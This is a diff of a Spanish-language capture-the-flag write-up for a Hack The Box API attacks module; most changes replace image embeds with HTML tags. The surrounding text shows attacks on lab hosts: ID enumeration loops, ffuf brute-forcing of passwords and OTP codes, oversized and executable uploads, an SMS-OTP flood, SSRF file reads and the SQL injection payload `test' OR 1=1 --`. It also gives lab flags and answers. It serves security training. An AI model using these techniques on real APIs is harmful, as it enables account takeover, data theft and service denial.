@@ -10,7 +10,9 @@
 curl -I http://154.57.164.64:30154/swagger
 ```
 
-![[Api Attacks Practise kestrel.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise kestrel.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **Kestrel**
 
@@ -20,7 +22,9 @@ answer: **Kestrel**
 http://154.57.164.64:30154/swagger/index.html#/
 ```
 
-![[Api Attacks Practise api current-user.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise api current-user.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **/api/v1/roles/current-user**
 
@@ -49,7 +53,9 @@ En primer lugar seleccionamos el siguiente endpoint **/api/v1/authentication/sup
 }
 ```
 
-![[Api Attacks Practise autentficaciona dasdas.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise autentficaciona dasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Tras el inicio de sesión, se conseguirá sus cookies
 
@@ -57,15 +63,21 @@ Tras el inicio de sesión, se conseguirá sus cookies
 "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc5MTQ1MzY3MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.xraPnxwM9n63D4GkRF8sbdIkyqnU4yoqBO8HuErS1yuWZRA6xMOQr47BfE8AudTMdy1Fae-iw8I-HLFbT-4IvQ"
 ```
 
-![[Api Attacks Practise cookiesss.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise cookiesss.png" width="600" alt="Resultado de Nmap">
+</p>
 
 En segundo lugar, en el botón **Authorize** se escribirá las cookies.
 
-![[Api Attacks Practise cookiies boton authorize.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise cookiies boton authorize.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Una vez autorizada, en tercer lugar, se sitúa en la pestaña **supliers** y se selecciona **/api/v1/suppliers/quarterly-reports/{ID}** y se prueba cualquier ID, por ejemplo, **1**. Esto ocurre porque hay confianza excesiva en el parámetro del ID. Los desarrolladores asumen que si el usuario tiene un token válido, puede ver cualquier recurso.
 
-![[Api Attacks Practise 1.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise 1.png" width="600" alt="Resultado de Nmap">
+</p>
 
 En cuarto paso, se realiza un bucle de Bash automatizando la consulta e iterando del 1 al 20 mediante `curl` utilizando tu token de autorización, procesa la respuesta con `jq` y acumula todo el contenido en el archivo `reports.txt`. De este modo, evitas tener que hacer cada petición de forma manual y puedes escanear rápidamente de golpe todos los reportes recopilados en busca de la primera bandera (_flag_) de la práctica.
 
@@ -74,6 +86,7 @@ for ((i=1; i<=20; i++)); do curl -s -w "\n" -X 'GET' "http://154.57.164.73:32804
 ```
 
 answer: **HTB{e76651e1f516eb5d7260621c26754776}**
+
 ### Broken Athentication
 
 1. **Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag.**
@@ -89,7 +102,9 @@ La cuenta pertenece a un cliente, se utilizará el endpoint **/api/v1/authentic
 }
 ```
 
-![[Api Attacks Practise token asdasdas.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise token asdasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El token de la sesión:
 
@@ -99,17 +114,23 @@ El token de la sesión:
 
 Se autentifica la sesión clicando en el botón **Authorize**
 
-![[Api Attacks Practise authortizead asdadad.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise authortizead asdadad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Al consultar el endpoint **/api/v1/roles/current-user**, se observa que al usuario autenticado se le asignan los siguientes roles: **Customers_UpdateByCurrentUser**, **Customers_Get** y **Customers_GetAll**.
 
-![[Api Attacks Practise roles asdjkajsda.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise roles asdjkajsda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El rol "**Customers_GetAll**" permite el acceso al punto final "**/api/v1/customers**", que devuelve registros de todos los clientes. Este punto de acceso expone información sensible como direcciones de correo electrónico, números de teléfono y fechas de nacimiento. Si bien esto representa un problema de autorización, no permite directamente el acceso no autorizado a la cuenta.
 
-![[Api Attacks Practise customers asdasda.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise customers asdasda.png" width="600" alt="Resultado de Nmap">
+</p>
 
-El que nos interesa sobre todo es del usuario **Mason Jenkins** 
+El que nos interesa sobre todo es del usuario **Mason Jenkins**
 
 ```json
 "id": "53428a83-8591-4548-a553-c434ad76a61a",
@@ -121,7 +142,9 @@ El que nos interesa sobre todo es del usuario **Mason Jenkins**
 
 La inspección del punto de acceso `/api/v1/customers/current-user` muestra que permite a los usuarios autenticados actualizar los detalles de su perfil, incluyendo su contraseña:
 
-![[Api Attacks Practise currentuseradasa.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise currentuseradasa.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Al intentar establecer una contraseña débil como "passw", la API rechaza la solicitud, indicando que se requiere una longitud mínima para la contraseña:
 
@@ -137,15 +160,21 @@ Al intentar establecer una contraseña débil como "passw", la API rechaza la so
 }
 ```
 
-![[Api Attacks Practise errror passwdassda.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise errror passwdassda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Esta respuesta detalla la política de contraseñas, revelando que la API solo exige una longitud mínima. Cuando la contraseña se establece con un valor débil pero válido, como 123456, la actualización se realiza correctamente. Que el apartado **successStatus** sea **true** confirma la existencia de una política de contraseñas débil, lo que hace que los ataques de fuerza bruta y el uso indebido de credenciales sean posibles.
 
-![[Api Attacks Practise truee session.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise truee session.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para preparar las pruebas de fuerza bruta, se intenta un inicio de sesión inválido para observar el mensaje de error que devuelve el punto de autenticación:
 
-![[Api Attacks Practise invalidpaswfoasda.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise invalidpaswfoasda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se genera una lista personalizada de contraseñas, con una longitud de al menos seis caracteres, a partir de la lista "**xato-net-10-million-passwords-100000.txt**".
 
@@ -161,7 +190,9 @@ ffuf -w xato_6plus.txt:FUZZ -request req.txt -request-proto http -fr "Invalid Cr
 
 Se evalúa la funcionalidad de restablecimiento de contraseña. Se inicia una solicitud de restablecimiento de OTP proporcionando la dirección de correo electrónico de la víctima `MasonJenkins@ymail.com`:
 
-![[Api Attacks Practise otp digito.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise otp digito.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El punto final de confirmación de restablecimiento de contraseña requiere un valor OTP:
 
@@ -179,7 +210,9 @@ Aunque el código OTP se envía a la víctima, la API no aplica límites de velo
 }
 ```
 
-![[Api Attacks Practise.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se genera una lista de códigos OTP de cuatro dígitos:
 
@@ -201,7 +234,9 @@ Se realizará el siguiente comando, recuerda que antes hay que activar la opcion
 ffuf -w otp.txt:FUZZ -request req.txt -request-proto http -fr "false"
 ```
 
-![[Api Attacks Practise 4825.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise 4825.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Con el codigo otp ya aplicado iniciamos sesión en el siguiente endpoint **/api/v1/authentication/customers/sign-in** con el correo `MasonJenkins@ymail.com` y pass **123456** recién cambiada.
 
@@ -233,13 +268,18 @@ Este endpoint **/api/v1/customers/current-user** está diseñado para consultar 
 }
 ```
 
-![[Api Attacks Practise truee adslasdklaca.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise truee adslasdklaca.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Este endpoint **/api/v1/customers/payment-options/current-user** se encarga de gestionar, listar o mostrar las **opciones de pago** (tarjetas, métodos de cobro, etc.) asociadas al usuario actual.
 
-![[Api Attacks Practise flag htbaapsiadb nkajsdn.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise flag htbaapsiadb nkajsdn.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{115a6329120e9eff13c4ec6a63343ed1}**
+
 ### Broken Object Property Level Authorization
 
 1. **Exploit another Excessive Data Exposure vulnerability and submit the flag.**
@@ -257,14 +297,16 @@ Authenticate to with user "`htbpentester5@hackthebox.com`" and password "**HTBPe
 
 Se obtiene el token de la sesión:
 
-```json=
-"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjRAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiXSwiZXhwIjoxNzkxNDY5NjUxLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.J2zhMo41YdQm-RZZH_sU4O_obosWRhu8ocTngjknKc5iyTbZH-at6VTfdagf4Nob1gCFiffHtaXycVEkXJV-3g"
+```{
+json="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjRAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiXSwiZXhwIjoxNzkxNDY5NjUxLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.J2zhMo41YdQm-RZZH_sU4O_obosWRhu8ocTngjknKc5iyTbZH-at6VTfdagf4Nob1gCFiffHtaXycVEkXJV-3g"
 }
 ```
 
 Se consultar el endpoint **/api/v1/roles/current-user**, se revela que al usuario autenticado se le han asignado las siguientes roles:
 
-![[Api Attacks Practise roles adsasdfgwse.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise roles adsasdfgwse.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para continuar con el siguiente paso, debes usar el endpoint de actualización de compañías (`PATCH /api/v1/supplier-companies`) para modificar el campo que otorga la exención de tarifas utilizando el identificador de tu empresa (`b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`).
 
@@ -395,7 +437,9 @@ eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8
     
 - **`CustomerOrderItems_Create`**: Permite agregar o crear nuevos ítems dentro de una orden de cliente.
 
-![[Api Attacks Practise sadasdaf.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise sadasdaf.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Post **/api/v1/customers/orders**: Envía un identificador de cliente (`id`) para registrar y crear una nueva orden pedido asociada a ese cliente en el sistema.
 
@@ -428,11 +472,14 @@ Post **/api/v1/customers/orders/items**: Añade nuevos elementos o productos a u
 }
 ```
 
-![[Api Attacks Practise htb.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise htb.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{4d86794f82046e465ca29d91bdbe5bca}**
 
 La vulnerabilidad: la API vincula ciegamente cada propiedad del cuerpo de la solicitud al modelo de objetos interno. Los campos Cantidad y Suma Neta están controlados por el usuario, lo que significa que un atacante podría establecer el precio en cero, asignar cantidades negativas o inyectar propiedades que la interfaz nunca expone (como DiscountPercentage o IsApproved). El servidor no impone una lista blanca de propiedades de entrada aceptables.
+
 ### Unrestricted Resource Consumption
 
 El consumo descontrolado de recursos (_Unrestricted Resource Consumption_) es una vulnerabilidad de seguridad que ocurre cuando una aplicación o API permite a los usuarios realizar operaciones intensivas, repetitivas o costosas sin aplicar límites adecuados como cuotas, restricciones de velocidad (_rate limiting_ o paginación), lo que permite que un atacante sature el servidor, provoque una denegación de servicio o genere gastos económicos masivos al abusar de servicios externos de pago como pasarelas de SMS o correo.
@@ -464,7 +511,9 @@ Se consulta los roles:
 
 Tras la autorización mediante JWT, al consultar `/api/v1/roles/current-user` se observa que el usuario autenticado tiene los siguientes roles:
 
-![[Api Attacks Practise permisosadmaskld.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise permisosadmaskld.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Al revisar los puntos de acceso (endpoints) relacionados con "SupplierCompanies", se observa que solo uno está asociado al rol "**SupplierCompanies_UploadCertificateOfIncorporation**":
 
@@ -494,7 +543,9 @@ Respuesta:
 }
 ```
 
-![[Api Attacks Practise apittaxckasdamadfd.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise apittaxckasdamadfd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Utilizando el ID de la empresa obtenido, primero generamos un archivo PDF de 30 MB que contiene datos aleatorios.
 
@@ -504,7 +555,9 @@ dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
 
 Luego subimos el archivo:
 
-![[Api Attacks Practise execyutwefadfasadfasf.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise execyutwefadfasadfasf.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La carga se realiza correctamente y la respuesta confirma tanto el tamaño del archivo como la ubicación de almacenamiento:
 
@@ -516,7 +569,9 @@ La carga se realiza correctamente y la respuesta confirma tanto el tamaño del a
 }
 ```
 
-![[Api Attacks Practise pdfsadsd.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise pdfsadsd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Esto demuestra que el punto final no aplica límites de tamaño de archivo. Sin medidas de seguridad adicionales, como la limitación de velocidad, un atacante podría subir repetidamente archivos grandes y agotar el espacio de almacenamiento disponible en disco, lo que provocaría condiciones de denegación de servicio y un aumento de los costos operativos. Para probar aún más la validación de entrada, intentamos subir un archivo que no sea PDF. Creamos un archivo ejecutable de 30 MB:
 
@@ -526,7 +581,9 @@ dd if=/dev/urandom of=reverse-shell.exe bs=1M count=30
 
 A continuación, volvemos a enviar la solicitud de carga:
 
-![[Api Attacks Practise execacawsdad.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise execacawsdad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La carga se realizó con éxito:
 
@@ -544,15 +601,20 @@ Esto confirma que el punto final no valida el tipo ni el contenido del archivo. 
 /api/v1/authentication/customers/passwords/resets/sms-otps
 ```
 
-![[Api Attacks Practise faseadasd.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise faseadasd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```bash
 for ((i=1; i<20; i++)); do curl -X 'POST' 'http://154.57.164.81:30634/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "htbpentester8@pentestercompany.com"}'; done
 ```
 
-![[Api Attacks Practise faldfasmsd.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise faldfasmsd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{01de742d8cd942ad682aeea9ce3c5428}**
+
 ### Broken Function Level Authorization
 
 1. **Exploit another Broken Function Level Authorization vulnerability and submit the flag.**
@@ -574,7 +636,9 @@ Esto convierte a la cuenta en una candidata ideal para probar los controles de a
 
 Enumeramos sistemáticamente los puntos finales de la API e identificamos el siguiente punto final de interés. Según la documentación de la API, este endpoint requiere el rol **ProductDiscounts_GetAll** Sin embargo, a pesar de carecer de esta función, al enviar una solicitud al punto final se devuelven datos de descuento para todos los productos:
 
-![[Api Attacks Practise 200adsasdaffg.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise 200adsasdaffg.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Esto confirma una vulnerabilidad de autorización a nivel de función rota. 
 
@@ -582,17 +646,22 @@ Aunque el punto final está documentado como restringido, no se aplica ningún c
 
 La enumeración continua de puntos finales revela otro punto final vulnerable. Parece ser que el usuario tiene el rol **CustomerBillingAddresses_GetAll** A pesar de carecer de esta función, el punto final responde con las direcciones de facturación de todos los clientes:
 
-![[Api Attacks Practise 200awhga web.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise 200awhga web.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Esto expone información personal altamente sensible, incluyendo direcciones residenciales, a usuarios no autorizados. Al guardar la respuesta en un archivo y filtrar por la bandera se obtiene:
 
-![[Api Attacks PractisegrAJKA.png]]
+<p align="center"> 
+<img src="images/Api Attacks PractisegrAJKA.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 grep -i "htb" billing-addresses.txt
 ```
 
 answer: **HTB{1e2095c564baf0d2d316080217040dae}**
+
 ### Unrestricted Access to Sensitive Business Flows
 
 1. **Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street address where the user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c' lives.**
@@ -608,13 +677,18 @@ Authenticate to 154.57.164.76 , with user "`htbpentester9@hackthebox.com`" and
 
 **/api/v1/customers/billing-addresses** devuelve el conjunto de datos completo sin autorización. La respuesta completa contiene direcciones de facturación para cada cliente del sistema.
 
-![[Api Attacks Practise cosasdvariasdascustomers.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise cosasdvariasdascustomers.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Si buscamos en el buscador de la pagina con el id **daa8c984-ba84-4265-8d88-12d6607e511c** se encontrará la calle donde vive.
 
-![[Api Attacks Practise street.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise street.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **788 Sauchiehall St.**
+
 ### Server Side Request Forgery
 
 1. **Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'.**
@@ -683,7 +757,9 @@ El id del producto recién creado
 }
 ```
 
-![[Api Attacks Practise idpostafgrrr.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise idpostafgrrr.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se tendra que tambien obtener el ID del usuario actual en este endpoint en Get **/api/v1/suppliers/current-user**
 
@@ -699,7 +775,9 @@ Se tendra que tambien obtener el ID del usuario actual en este endpoint en Get *
 }
 ```
 
-![[Api Attacks Practise id supeert id didid.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise id supeert id didid.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación se lleva a cabo el ataque SSRF en el siguiente endpoint PATCH **/api/v1/products**
 
@@ -717,19 +795,26 @@ A continuación se lleva a cabo el ataque SSRF en el siguiente endpoint PATCH **
 
 Se modificó con éxito el producto
 
-![[Api Attacks Practise modificpatch.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise modificpatch.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación en el endpoint **/api/v1/products/{ID}/photo** se escribirá el id del producto recién modificado.
 
-![[Api Attacks Practise base64grf.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise base64grf.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 echo "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo=" | base64 -d
 ```
 
-![[Api Attacks Practise base64htadsad.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise base64htadsad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{3c94232c4f0b0a544ae4024833eef0b3}**
+
 ### Security Missconfiguration
 
 1. **Exploit another Security Misconfiguration and provide the total count of records within the target table.**
@@ -761,7 +846,9 @@ Esto otorga acceso a GET **/api/v1/suppliers/{Name}/count**.
 
 El recuento total de proveedores se consiguió introduciendo una inyección SQL (`test' OR 1=1 --`) dentro del parámetro de ruta `{Name}` del endpoint `/api/v1/suppliers/{Name}/count`, lo que altera la consulta subyacente a la base de datos para que la condición sea siempre verdadera y devuelva el total absoluto de registros almacenados en la tabla (151).
 
-![[Api Attacks Practise sqligr.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise sqligr.png" width="600" alt="Resultado de Nmap">
+</p>
 
 2. **Submit the header and its value that expose another Security Misconfiguration in the API.**
 
@@ -775,31 +862,42 @@ Authorization: Bearer <JWT>
 Origin: http://127.0.0.1
 ```
 
-![[Api Attacks Practise corssdad.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise corssdad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **Access-Control-Allow-Origin:`*`**
+
 ### Improper Inventory Management
 
 1. **Exploit the Improper Inventory Management vulnerability and submit the value of the 'Email' field from the deleted Supplier Company with the ID 'c250cb38-96e3-4ccf-9df2-0a03146a2d0b'.**
 
 Se selecciona la version v0
 
-![[Api Attacks Practise version0.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise version0.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Luego en el endpoint **/api/v0/supplier-companies/deleted** buscando el id **c250cb38-96e3-4ccf-9df2-0a03146a2d0b** se encontrará la flag del ejercicio.
 
-![[Api Attacks Practise otra flag mas.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise otra flag mas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{43c2754afea99eba70fb2c8dc443c660}**
+
 ### Unsafe Consumption of APIs
 
 1. **If v1 of Inlanefreight's E-Commerce Marketplace accepted data from the '/api/v0/suppliers/deleted' endpoint unsafely, what would the password hash of 'Yara MacDonald' be in v1?** 
 
 En el endpoint **/api/v0/suppliers/deleted** si buscamos el usuario **Yara MacDonald** se encontrará el hash de su pass.
 
-![[Api Attacks Practise pass v0.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise pass v0.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **006006C3167E90A7575A12E474218D86**
+
 ## Skills Assessment 
 
 ### Skills Assessment 
@@ -841,7 +939,9 @@ Solo dos puntos finales de API están asociados a estos roles:
 
 Al llamar a la API **/v2/suppliers**, se devuelve una lista de todos los proveedores. La respuesta contiene información detallada del proveedor, incluido el campo `professionalCVPDFFileURI`
 
-![[Api Attacks Practiselista proovedrores.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practiselista proovedrores.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Dado que el objetivo es recuperar **/flag.txt**, este campo sugiere un posible vector de ataque SSRF o de inclusión de archivos locales (LFI), lo que coincide con las vulnerabilidades analizadas anteriormente en la sección de falsificación de solicitudes del lado del servidor (SSRF).
 
@@ -853,7 +953,7 @@ Existe un punto final para cargar los currículos de los proveedores:
 
 Un primer intento de subir un archivo PDF grande falla.
 
-Respuesta: 
+Respuesta:
 
 ```
 {
@@ -897,7 +997,9 @@ En la sección de Autenticación, se identifica la siguiente funcionalidad de re
 
 Se capturará la siguiente petición con **Burpsuite**
 
-![[Api Attacks Practise post gr.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise post gr.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El siguiente comando descargar un .txt de todos los colores:
 
@@ -911,7 +1013,9 @@ Se utiliza una lista de palabras que contiene colores comunes para realizar un a
 ffuf -w emails.txt:FUZZ1 -w colors.txt:FUZZ2 -request req1.txt -request-proto http -fr "false"
 ```
 
-![[Api Attacks Practise cred.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise cred.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Credenciales --> `B.Rogers1535@globalsolutions.com`:**pass123**
 
@@ -923,6 +1027,7 @@ Iniciamos sesión en el siguiente endpoint **/api/v2/authentication/suppliers/si
   "Password": "pass123"
 }
 ```
+
 #### LFI
 
 Se emite un JWT de proveedor válido. Con los privilegios de proveedor, el punto final de carga de CV ahora funciona correctamente:
@@ -943,17 +1048,24 @@ En el endpoint **/api/v2/suppliers/current-user/cv** se sube, al fin se logra su
 }
 ```
 
-![[Api Attacks Practise pdf 1mbn.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise pdf 1mbn.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La consulta del perfil del proveedor confirma que la ruta del archivo local se almacena en el campo "professionalCVPDFFileURI".
 
 En Get **/api/v2/supplier/current-user** se consigue `"companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1"`
 
-![[Api Attacks Practise companyid.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise companyid.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El ID del usuario es **36f17195-395f-443e-93a4-8ceee81c6106** Que se encuentra en el endpoint **/api/v2/suppliers**
 
-![[Api Attacks Practise id sdadasda.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise id sdadasda.png" width="600" alt="Resultado de Nmap">
+</p>
+
 #### SSRF
 
 Luego, PATCH en el endpoint **/api/v2/suppliers/current-user**
@@ -972,16 +1084,22 @@ Luego, PATCH en el endpoint **/api/v2/suppliers/current-user**
 }
 ```
 
-![[Api Attacks Practise trueeeeedasdasasd.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise trueeeeedasdasasd.png" width="600" alt="Resultado de Nmap">
+</p>
 
-En get **/api/v2/suppliers/current-user/cv** cuando ejecutamos nos dará el base64. `SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=` 
+En get **/api/v2/suppliers/current-user/cv** cuando ejecutamos nos dará el base64. `SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=`
 
-![[Api Attacks Practise base64asdasdf.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise base64asdasdf.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=" | base64 -d
 ```
 
-![[Api Attacks Practise flaggggggasdasdasa.png]]
+<p align="center"> 
+<img src="images/Api Attacks Practise flaggggggasdasdasa.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{f190b80cd543a84b236e92a07a9d8d59}**
